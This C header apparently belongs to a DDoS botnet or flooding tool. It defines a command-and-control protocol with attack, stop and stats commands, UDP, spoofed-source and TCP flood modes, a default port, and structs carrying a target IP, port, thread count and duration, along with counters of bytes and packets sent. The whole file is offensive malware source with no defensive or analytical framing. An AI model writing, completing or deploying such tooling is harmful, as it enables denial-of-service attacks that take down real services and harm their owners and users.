#ifndef C2PROTO_H
#define C2PROTO_H

#include <stdint.h>

#define C2_MAGIC         0xC2C0FFEEu
#define C2_PORT_DEFAULT  7777
#define C2_MAXTHREADS    256

enum {
    C2_CMD_ATTACK = 1,
    C2_CMD_STOP   = 2,
    C2_CMD_STATS  = 3
};

enum {
    C2_MODE_UDP   = 0,
    C2_MODE_SPOOF = 1,
    C2_MODE_TCP   = 2
};

typedef struct {
    uint32_t magic;
    uint8_t  type;
    uint8_t  mode;      /* C2_MODE_* */
    uint16_t threads;   /* 0 = auto (nproc) */
    uint16_t port;
    uint32_t duration;
    char     ip[48];
    uint32_t pad;
} c2_pkt_t;

typedef struct {
    uint32_t magic;
    uint8_t  type;      /* C2_CMD_STATS */
    uint8_t  state;     /* 1 = attacking, 0 = idle */
    uint16_t pad1;
    uint32_t seq;
    uint64_t bytes;
    uint64_t pkts;
} c2_stats_t;

#endif
